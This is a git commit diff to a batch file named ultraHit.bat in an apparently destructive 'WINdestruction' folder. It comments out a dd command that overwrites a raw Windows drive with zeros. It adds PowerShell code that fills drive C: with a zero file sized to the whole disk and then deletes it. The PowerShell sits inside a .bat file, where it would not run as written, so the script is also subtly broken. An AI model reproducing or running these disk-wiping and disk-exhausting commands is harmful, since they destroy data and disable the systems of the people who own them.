cb9cc81125dee6f31b374f7ee8a9690666c41b94
nsʇnɾ ʇǝɹɔǝs <92639080+SECRET-GUEST@users.noreply.github.com>
2024-02-13 08:03:33 +0100

    Update ultraHit.bat

--- windows/d4rk/WINdestruction/ultraHit.bat
+++ windows/d4rk/WINdestruction/ultraHit.bat
@@ -1,1 +1,20 @@
-dd if=/dev/zero of=\\.\X: bs=1M
+REM dd if=/dev/zero of=\\.\X: bs=1M
+
+$drive = "C:"
+$blockSize = 1MB
+$driveInfo = Get-PSDrive -Name $drive[0]
+$totalSize = $driveInfo.Used + $driveInfo.Free
+$filePath = $drive + "\zero.bin"
+
+$fs = [System.IO.File]::Create($filePath)
+$bytes = New-Object byte[] $blockSize
+$written = 0
+
+while ($written -lt $totalSize) {
+    $fs.Write($bytes, 0, $bytes.Length)
+    $fs.Flush()
+    $written += $bytes.Length
+}
+
+$fs.Close()
+Remove-Item $filePath
